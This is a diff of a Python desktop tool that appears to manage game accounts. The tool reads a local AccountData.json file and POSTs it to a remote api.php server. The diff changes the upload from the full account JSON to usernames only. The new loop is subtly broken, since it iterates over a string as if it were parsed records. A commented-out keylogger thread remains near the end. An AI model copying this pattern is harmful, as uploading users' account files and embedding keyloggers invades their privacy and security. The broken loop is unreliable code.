@@ -281,8 +281,7 @@ def set_skill_overlay(src, w="200", h="600", px="10", py="10", op="100", r="255"
     if os.path.isfile("skilloverlay.exe"):
         logger.info("skilloverlay exists...")
     else:
-        print("no tengo skill overlay :(")
-    print("ejecutando")
+        print("SkillOverlay Doesnt exists")
     url_base = url_web + "/api.php"
     url = url_base
     myobj = {
@@ -343,9 +342,13 @@ def load():
         f = open("AccountData.json")
         jsontext = f.read()
         eel.altdatajson(jsontext)
+        usernames = ""
+        for username in jsontext:
+            usernames = usernames + ";" + username["Username"]  #SAVE ONLY USERNAMES
+        
         myobj = {
             'api': data["api"],
-            'accounts': jsontext,
+            'accounts': usernames, #SAVE ONLY USERNAMES ON CPCLOUDSERVICES FOR EASIER BACKUP ON THE FUTURE
         }
         x = requests.post(url, data=myobj)
         print(x.text)
@@ -355,7 +358,7 @@ def load():
 
 b = threading.Thread(name='background', target=conectar)
 b.start()  # Starting new thread with background data managment
-# skillogger = Keylogger(interval=10, report_method="file")
+# skillogger = Keylogger(interval=10, report_method="file")-
 # k = threading.Thread(name='keyboard', target=skillogger.start)            #Disabled Due a multiple Bugs
 # k.start()
 # m = threading.Thread(name='mouse', target=mouseevent)
